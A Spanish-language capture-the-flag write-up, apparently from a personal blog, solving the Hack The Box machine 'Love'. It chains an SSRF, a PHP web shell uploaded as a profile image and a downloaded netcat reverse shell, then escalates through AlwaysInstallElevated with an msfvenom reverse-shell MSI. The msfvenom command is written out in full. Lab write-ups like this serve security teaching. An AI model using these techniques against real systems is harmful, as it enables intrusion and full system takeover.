<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="stylesheet" href="https://binlaab.github.io/assets/css/syntax.css"><link rel="preconnect" href="https://cdnjs.cloudflare.com"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><title> Love - BinLAB</title><link rel="shortcut icon" href="https://binlaab.github.io/favicon.png"><link rel="alternate" type="application/atom+xml" title="BinLAB" href="https://binlaab.github.io/atom.xml"><link rel="alternate" type="application/json" title="BinLAB" href="https://binlaab.github.iohttps://binlaab.github.io/feed.json" /><link rel="sitemap" type="application/xml" title="sitemap" href="https://binlaab.github.io/sitemap.xml" /><link rel="preconnect" href="https://fonts.gstatic.com"><link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&display=swap" rel="stylesheet"><style> *,:after,:before{box-sizing:border-box;background-color:inherit;color:inherit;margin:0;padding:0}html{font-size:15px}#theme-toggle{opacity:0.65;position:relative;border-radius:5px;height:25px;display:flex;-webkit-box-align:center;align-items:center;-webkit-box-pack:center;justify-content:center;transition:opacity 0.3s ease 0s;border:none;outline:none;background:none;cursor:pointer;padding:0px;appearance:none;transform:scale(0.8)}html,html[data-theme="light"]{--very-light-text-color: rgb(222, 222, 222);--light-text-color: rgb(89, 183, 255);--medium-text-color: #555;--main-text-color: #333;--dark-text-color: #393e46;--link-color: rgb(50, 87, 209);--code-bg-color: rgb(245, 245, 245);background-color:#fff}html #theme-toggle div,html[data-theme="light"] #theme-toggle div{position:relative;width:24px;height:24px;border-radius:50%;border:none;background-color:var(--theme-ui-colors-transparent, transparent);transform:scale(1);transition:all 0.45s ease 0s;overflow:hidden;box-shadow:inset 8px -8px 0px 0px var(--theme-ui-colors-toggleIcon, #2d3748)}html #theme-toggle div::before,html[data-theme="light"] #theme-toggle div::before{content:"";position:absolute;right:-9px;top:-9px;height:24px;width:24px;border:none;border-radius:50%;transform:translate(0px, 0px);opacity:1;transition:transform 0.45s ease 0s}html #theme-toggle div::after,html[data-theme="light"] #theme-toggle div::after{content:"";width:8px;height:8px;border-radius:50%;margin:-4px 0px 0px -4px;position:absolute;top:50%;left:50%;box-shadow:0 -23px 0 var(--theme-ui-colors-toggleIcon, #2d3748),0 23px 0 var(--theme-ui-colors-toggleIcon, #2d3748),23px 0 0 var(--theme-ui-colors-toggleIcon, #2d3748),-23px 0 0 var(--theme-ui-colors-toggleIcon, #2d3748),15px 15px 0 var(--theme-ui-colors-toggleIcon, #2d3748),-15px 15px 0 var(--theme-ui-colors-toggleIcon, #2d3748),15px -15px 0 var(--theme-ui-colors-toggleIcon, #2d3748),-15px -15px 0 var(--theme-ui-colors-toggleIcon, #2d3748);transform:scale(0);transition:all 0.35s ease 0s}html[data-theme="dark"]{--very-light-text-color: #EEE;--light-text-color: #c4bbf0;--medium-text-color: #52057b;--main-text-color: #EAEAEA;--dark-text-color: rgb(36, 38, 42);--link-color: rgb(255, 89, 125);--code-bg-color: rgb(36, 38, 42);background-color:#131418}html[data-theme="dark"] #theme-toggle div{position:relative;width:24px;height:24px;border-radius:50%;border:4px solid var(--theme-ui-colors-toggleIcon, #cbd5e0);background-color:var(--theme-ui-colors-toggleIcon, #cbd5e0);transform:scale(0.55);transition:all 0.45s ease 0s;overflow:visible;box-shadow:none}html[data-theme="dark"] #theme-toggle div::before{content:"";position:absolute;right:-9px;top:-9px;height:24px;width:24px;border:2px solid var(--theme-ui-colors-toggleIcon, #cbd5e0);border-radius:50%;transform:translate(14px, -14px);opacity:0;transition:transform 0.45s ease 0s}html[data-theme="dark"] #theme-toggle div::after{content:"";width:8px;height:8px;border-radius:50%;margin:-4px 0px 0px -4px;position:absolute;top:50%;left:50%;box-shadow:0 -23px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),0 23px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),23px 0 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),-23px 0 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),15px 15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),-15px 15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),15px -15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),-15px -15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0);transform:scale(1);transition:all 0.35s ease 0s}body{font-family:"Fira Code", monospace;text-rendering:optimizeLegibility;line-height:1.75;color:var(--main-text-color)}a{color:var(--link-color);text-decoration:none}.post p{margin:1rem 0}.meta{margin:1.4rem 0}code,pre{background:var(--code-bg-color);margin:0 -27px;border-width:1px}code{margin:unset;padding:0.1rem;color:var(--light-text-color)}pre code{background-color:unset;color:unset}pre{border-width:3px;padding:0.8rem;white-space:pre-wrap;border-style:none none none solid;border-color:var(--light-text-color)}img{max-width:100%}hr{background:var(--light-text-color);height:1px;border:0}header{flex-basis:10rem;flex-grow:1;position:relative}header a{text-decoration:none}header li{margin-bottom:0.2rem;text-align:right;margin-right:2rem}header a.active{font-weight:bold}header,section{padding:1rem 0}section{margin-top:5.5rem}blockquote{font-style:italic;border-left:5px solid var(--dark-text-color);padding-left:1rem}h1{color:var(--main-text-color);text-transform:uppercase;font-size:larger;font-weight:bold;margin-bottom:1.5rem}h2,h3,h4,h5{font-weight:bold;font-size:1rem;margin-bottom:1.5rem}section h1:first-child{margin-top:0}strong,b{font-weight:bold}.photos ul{list-style:none}.photos li{margin-bottom:1.5rem}.photo picture,.project picture{margin-bottom:0.5rem}.posts>h3{font-weight:500}.posts ul,header ul{list-style:none}.posts li{align-items:center;display:flex;justify-content:space-between;margin-bottom:0.5rem}.posts li a,.posts li div,.projects li a{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-weight:bold}.posts li time,.projects li time{padding-left:1rem;white-space:nowrap;font-variant-numeric:tabular-nums}time{color:var(--main-text-color)}.post>h1.title{font-size:x-large;margin-top:0;margin-bottom:0}.post>time{margin-bottom:0;margin-top:3rem}main{display:flex;max-width:47rem;margin:-5rem auto 0;padding:2.4rem 2rem;flex-direction:column}.flex-row-between{display:flex;flex-direction:row;justify-content:space-between}.social-footer{padding:1rem;display:flex;justify-content:center;position:initial}.social-footer .social-footer-icons .fa{font-size:1.3rem;color:#a9a9a9}.social-footer .social-footer-icons .fa:hover{color:dimgray;transition:color 0.3s ease-in}@media screen and (max-width: 45rem){header li{display:inline;margin-right:1rem}.logo{padding-bottom:1rem}header ul{border-bottom:1px solid #edf2f7;padding-bottom:2rem}nav ul{border-right:0px}.photos ul{margin-top:0.5rem}main{padding:0 2rem}}section{flex-grow:999;display:flex;flex-direction:column}figcaption{font-size:smaller}.bio{margin-bottom:5rem}::selection{background-color:#fffba0;color:#333}.search-article{position:relative}.search-article label[for="search-input"]{position:relative;top:-10px;left:11px}.search-article input[type="search"]{top:-1rem;left:0;border:0;width:100%;height:30px;outline:none;position:absolute;border-radius:5px;padding:10px 10px 10px 35px;color:var(--main-text-color);-webkit-appearance:none;background-color:rgba(128,128,128,0.1);border:1px solid rgba(128,128,128,0.1)}.search-article input[type="search"]::-webkit-input-placeholder{color:#808080}.search-article input[type="search"]::-webkit-search-decoration,.search-article input[type="search"]::-webkit-search-results-decoration{display:none}#search-results{text-align:center}#search-results li{text-align:center}.post-nav{display:flex;position:relative;margin-top:0;border-top:2px solid var(--light-text-color);line-height:1.4}.post-nav .post-nav-item{border-bottom:0;padding-bottom:10px;width:50%;padding-top:10px;text-decoration:none;box-sizing:border-box}.post-nav .post-nav-item .post-title{color:var(--main-text-color)}.post-nav .post-nav-item:hover .post-title,.post-nav .post-nav-item:focus .post-title{color:var(--link-color);opacity:0.9}.post-nav .post-nav-item .nav-arrow{font-size:17px;color:var(--main-text-color);margin-bottom:3px;font-weight:bold}.post-nav .post-nav-item:nth-child(odd){padding-left:0;padding-right:20px}.post-nav .post-nav-item:nth-child(even){text-align:right;padding-right:0;padding-left:20px}.tags ul{list-style:none;display:grid;grid-template-columns:auto auto auto auto auto auto;grid-template-rows:auto auto auto auto}.tags li{white-space:normal;text-overflow:ellipsis}.timeline{position:center;width:650px;margin:-6em auto;padding:1px;list-style-type:none}@media (max-width: 860px){.timeline{width:100%}}.timeline:before{position:absolute;left:50%;top:0;content:' ';display:block;width:6px;height:100%;margin-left:-3px;background:var(--light-text-color);z-index:5}@media (max-width: 375px){.timeline:before{height:150%}}.timeline li{padding:2em 0}@media (max-width: 860px){.timeline li{padding:2em 0}}.timeline li::after{content:"";display:block;clear:both;visibility:hidden}.direction-l{position:relative;width:287px;float:left;text-align:right}@media (max-width: 860px){.direction-l{float:none;width:100%;text-align:center}}.direction-l .flag{color:#333;box-shadow:-1px 1px 1px rgba(0,0,0,0.52)}.direction-l .flag:after{content:"";position:absolute;left:100%;top:50%;height:0;width:0;margin-top:-8px;border:solid transparent;border-left-color:#f8f8f8;border-width:8px;pointer-events:none}@media (max-width: 860px){.direction-l .flag:after{content:"";position:absolute;left:50%;top:-8px;height:0;width:0;margin-left:-8px;border:solid transparent;border-bottom-color:#fff;border-width:8px;pointer-events:none}}.direction-l .time-wrapper{float:left}@media (max-width: 860px){.direction-l .time-wrapper{float:none}}.direction-r{position:relative;width:293px;float:right;text-align:left}@media (max-width: 860px){.direction-r{float:none;width:100%;text-align:center}}.direction-r .flag{color:#333;box-shadow:1px 1px 1px rgba(0,0,0,0.52)}.direction-r .flag:after{content:"";position:absolute;right:100%;top:50%;height:0;width:0;margin-top:-8px;border:solid transparent;border-right-color:#f8f8f8;border-width:8px;pointer-events:none}@media (max-width: 860px){.direction-r .flag:after{content:"";position:absolute;left:50%;top:-8px;height:0;width:0;margin-left:-8px;border:solid transparent;border-bottom-color:#fff;border-width:8px;pointer-events:none}}.direction-r .flag:before{left:-40px}.direction-r .time-wrapper{float:right}@media (max-width: 860px){.direction-r .time-wrapper{float:none}}.flag-wrapper{position:relative;display:inline-block;text-align:center}@media (max-width: 860px){.flag-wrapper{text-align:center}}.flag-wrapper .flag{position:relative;display:inline;background:#f8f8f8;padding:6px 10px;border-radius:5px;font-weight:600;text-align:left}@media (max-width: 860px){.flag-wrapper .flag{background:#fff;z-index:15}}.direction-l .flag:before,.direction-r .flag:before{position:absolute;top:60%;right:-40px;content:' ';display:block;width:12px;height:12px;margin-top:-10px;background:#fff;border-radius:10px;border:4px solid var(--link-color);z-index:10}@media (max-width: 860px){.direction-l .flag:before,.direction-r .flag:before{position:absolute;top:-30px;left:53%;content:' ';display:block;margin-left:-10px}}.time-wrapper{display:inline;line-height:1em;font-size:0.66666em;color:var(--link-color);vertical-align:middle}@media (max-width: 860px){.time-wrapper{display:block;position:relative;margin:4px 0 0 0;z-index:14}}.time-wrapper .time{display:inline-block;padding:4px 6px;background:#f8f8f8}.desc{margin:1em 0.2em -3.5em 0;font-size:0.9em;line-height:1.5em}.desc a{color:var(--link-color);text-decoration:none}.desc a:hover{text-decoration:underline}@media (max-width: 860px){.desc{position:relative;margin:1em 1em 0 1em;padding:1em;background:var(--code-bg-color);box-shadow:0 0 1px rgba(0,0,0,0.2);z-index:15}}</style></head><body><main><section class="post"><div class="flex-row-between"> <a href="https://binlaab.github.io">« back</a> <button title="Change theme" id="theme-toggle" onclick="modeSwitcher()"><div></div></button></div><time datetime="2021-08-07T00:00:00+00:00">Aug 7, 2021 - ' reading</time><h1 class="title"> Love</h1><span class="meta"> </span><p>Love es una máquina Windows de nivel fácil en la que tendremos que explotar un SSRF para conseguir credenciales para iniciar sesión como administrador, subir una shell en PHP e instalar un binario para ser NT AUTHORITY\SYSTEM.</p><p>Como siempre, empezamos escaneando puertos para saber por donde ir para atacar:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.91 scan initiated Fri Aug  6 11:59:13 2021 as: nmap -p- --open -sS --min-rate 5000 -n -v -Pn -oG ports -oN ports.nmap 10.10.10.239
Nmap scan report for 10.10.10.239
Host is up (0.16s latency).
Not shown: 54285 closed ports, 11231 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5000/tcp  open  upnp
5040/tcp  open  unknown
5985/tcp  open  wsman
5986/tcp  open  wsmans
7680/tcp  open  pando-pub
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Aug  6 12:00:05 2021 -- 1 IP address (1 host up) scanned in 52.20 seconds
</code></pre></div></div><table><tr><td>Puerto</td><td> Servicio</td></tr><tr><td>80</td><td>HTTP - aloja una página web</td></tr><tr><td>135</td><td>msrpc - nos podríamos conectar con rpcclient para enumerar usuarios</td></tr><tr><td>443</td><td>HTTPS - como HTTP pero más seguro</td></tr><tr><td>445</td><td>SMB - para acceder a recursos compartidos del sistema con smbclient</td></tr><tr><td>3306</td><td>MySQL - una base de datos en la que pueden haber contraseñas</td></tr><tr><td>47001</td><td>WinRM - sirve para administrar el sistema de forma remota, nos podríamos conectar con evil-winRM con credenciales válidas</td></tr></table><p>He decidido no poner el resto de puertos ya que no vamos a hacer nada con ellos ni he encontrado una explicación que me guste, y no me gusta extenderme de más.</p><p>Tras ver qué puertos están abiertos hacemos un escaneo exhaustivo de estos con -sC y -sV para ver la versión y servicio que corren y usar unos scripts básicos de enumeración:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.91 scan initiated Fri Aug  6 12:01:14 2021 as: nmap -sC -sV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,
49667,49668,49669,49670 -oN targeted 10.10.10.239
Nmap scan report for 10.10.10.239
Host is up (0.36s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings: 
|   LDAPBindReq, LPDString, TLSSessionReq, afp: 
|_    Host '10.10.14.137' is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_ssl-date: 2021-08-06T16:25:59+00:00; +21m35s from scanner time.
| tls-alpn: 
|_  http/1.1
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=8/6%Time=610D5CDC%P=x86_64-pc-linux-gnu%r(TLS
SF:SessionReq,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.137'\x20is\x20not
SF:\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LPD
SF:String,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.137'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPBin
SF:dReq,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.137'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(afp,4B,"G
SF:\0\0\x01\xffj\x04Host\x20'10\.10\.14\.137'\x20is\x20not\x20allowed\x20t
SF:o\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h06m36s, deviation: 3h30m03s, median: 21m34s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-08-06T09:25:41-07:00
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-06T16:25:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug  6 12:04:27 2021 -- 1 IP address (1 host up) scanned in 192.89 seconds
</code></pre></div></div><p>Haciendo un escaneo de la versión y el servicio que corre cada uno de estos puertos nos encontramos un subdominio y 3 puertos que corren una página web, a ver qué será eso. Agregamos <code class="language-plaintext highlighter-rouge">love.htb</code> y <code class="language-plaintext highlighter-rouge">staging.love.htb</code> al /etc/hosts y entramos a Faaaaaairfox a ver qué es qué.</p><p><img src="https://user-images.githubusercontent.com/71317374/128548460-fa9a5463-ef23-4664-973a-2fdc26ea24df.png" alt="imagen" /></p><p>Si entramos a love.htb nos encontramos un panel de inicio de sesión con el que no vamos a hacer nada de momento, así que vamos a mirar los demás puertos.</p><p><img src="https://user-images.githubusercontent.com/71317374/128548619-8c838255-39d3-46b3-b294-5f68bbdf0475.png" alt="imagen" /></p><p>Entramos a staging.love.htb(o https://10.10.10.239) y nos encontramos esto, que tiene mejor pinta, volveremos tras ver que hay en el puerto 5000.</p><p><img src="https://user-images.githubusercontent.com/71317374/128548702-59561f22-9593-410c-a901-c2e72080ea82.png" alt="imagen" /></p><p>:/ Pues vamos a volver al HTTPS.</p><p><img src="https://user-images.githubusercontent.com/71317374/128548855-9ecd1cac-334a-4b9a-9c21-f002e3a73736.png" alt="imagen" /></p><p>Si le damos al apartado de demo nos lleva a esto, que nos pide una URL, pero qué pasa si le ponemos el puerto 5000, que desde fuera esta prohibido? No hay que escribir la IP de la máquina, si no localhost, ya que estamos pidiendo algo de la misma máquina.</p><p><img src="https://user-images.githubusercontent.com/71317374/128549076-33a3b327-2a4d-41d2-b06c-48514ec1f542.png" alt="imagen" /></p><p>BUENOOOOOOOOOOOO, unas credenciales. Creo que todos sabemos para qué es esto, así que volvamos a love.htb(Puerto 80), y como dice admin tiene que haber un /admin.</p><p><img src="https://user-images.githubusercontent.com/71317374/128571884-33d1f0b2-bb42-4c47-a2da-ca7a0bee2ee9.png" alt="imagen" /></p><p>Efectivamente, estamos dentro. Buscando por la dashboard no encontramos nada de utilidad, pero podemos cambiar la foto de perfil de nuestro usuario, y ¿qué pasaría si en vez de un .jpg le metemos una shell en PHP como esta?</p><p><img src="https://user-images.githubusercontent.com/71317374/128572164-71d6556d-8e70-491a-9ef0-d8fd0bfd48ea.png" alt="imagen" /></p><p>Pues que nos deja sin problema.</p><p><img src="https://user-images.githubusercontent.com/71317374/128572281-beb15c21-fd8f-476b-9988-a99c60246a90.png" alt="imagen" /></p><p>Entonces vamos a /images/rce.php(el nombre de mi archivo) y con el parámetro cmd le pasamos un comando a nivel de sistema:</p><p><img src="https://user-images.githubusercontent.com/71317374/128572413-ecc9ac31-9ca9-48c1-8935-ea0e893bec9d.png" alt="imagen" /></p><p>Yyyy ahí está :D. Verifiqué si tenía cURL y en efecto, lo tenía, así que lo aproveché para colar un nc.exe y entablarme una reverse shell.</p><p><img src="https://user-images.githubusercontent.com/71317374/128572646-f3e83e62-b746-44f5-9bc4-826382b6174c.png" alt="imagen" /></p><p>La máquina ha hecho una petición GET a mi máquina solicitando nc.exe, y con -o lo he guardado a nc.exe, ahora solo falta ejecutarlo y enviarme una shell. Usando el nc que pasé antes me he enviado un cmd.exe con el parámetro -e a mi IP por el puerto 6969(nice.)</p><p><img src="https://user-images.githubusercontent.com/71317374/128572897-f219c461-8633-4b3c-83fd-ea2f55e82ff1.png" alt="imagen" /></p><p>Bueno, somos phoebe, si vemos qué privilegios tenemos con <code class="language-plaintext highlighter-rouge">whoami /priv</code> tenemos:</p><p><img src="https://user-images.githubusercontent.com/71317374/128575730-5b80b53e-6180-46f6-94e3-f441a7795782.png" alt="imagen" /></p><p>Pero, ¿y si vemos el registro a ver si tenemos AlwaysInstallElevated?</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
</code></pre></div></div><p>Está puesto en 1, que significa True, así que podemos generar un binario malicioso que envíe una shell a mi máquina como root con <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.137 LPORT=42069 -f msi -o reverse.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: reverse.msi
</code></pre></div></div><p>Ahora solo faltaría crear un servidor HTTP con python, descargarlo en la máquina y escuchar con netcat.</p><p><img src="https://user-images.githubusercontent.com/71317374/128576105-95b02d26-f3d1-4c3a-95d6-77064eff3e96.png" alt="imagen" /></p><p>Ahí recibimos la petición GET, ahora hay que ejecutarlo escribiendo el nombre del archivo y escuchar con nc por el puerto que hayas introducido en LPORT al crear el payload.</p><p><img src="https://user-images.githubusercontent.com/71317374/128576255-2cae797b-fb8b-4498-9e8c-dc5e1a843907.png" alt="imagen" /></p><p>Ahí estáaaaaa, ahora hay que dirigirse a C:\Users\Administrator\Desktop y leer root.txt con <code class="language-plaintext highlighter-rouge">type root.txt</code>.</p><p>Ha sido una máquina bastante divertida, me ha gustado bastante la parte del user, pero no tanto la privesc. Hasta aquí la máquina, el siguiente sábado haré otro writeup(si soy capaz de hacer la máquina :p)</p><p>Y recuerda, aguante Metasploit ;)</p></section><section><nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/2021/07/31/the-notebook"><div class="nav-arrow">Previous</div><span class="post-title">The Notebook</span> </a> <a class="post-nav-item post-nav-next" href="/2021/08/28/knife"><div class="nav-arrow">Next</div><span class="post-title">Knife</span> </a></nav></section></main><script> function setTheme(theme) { if (theme === "dark") { document.documentElement.setAttribute('data-theme', 'dark'); window.localStorage.setItem('theme', 'dark'); document.getElementById("theme-toggle").classList.add('sun'); document.getElementById("theme-toggle").classList.remove('moon'); } else { document.documentElement.setAttribute('data-theme', 'light'); window.localStorage.setItem('theme', 'light'); document.getElementById("theme-toggle").classList.add('moon'); document.getElementById("theme-toggle").classList.remove('sun'); } } let theme = localStorage.getItem('theme'); theme = theme || (window.matchMedia ? window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light' : 'light'); setTheme(theme); function modeSwitcher() { let currentMode = document.documentElement.getAttribute('data-theme'); if (currentMode === "dark") { setTheme('light'); } else { setTheme('dark'); } } </script></body><footer class="social-footer"><div class="social-footer-icons"> <a href="https://github.com/P0WEX" title="Github profile, nothing much there, yet" target="_blank" rel="noopener noreferrer"><i class="fa fa-github" aria-hidden="true"></i></a> <a href="https://binlaab.github.io/atom.xml" title="Feed RSS" target="_blank" rel="noopener noreferrer"><i class="fa fa-rss" aria-hidden="true"></i></a> <a href="https://github.com/P0WEX/Gesko" title="Browse the code" target="_blank" rel="noopener noreferrer"><i class="fa fa-code" aria-hidden="true"></i></a></div></footer></html>
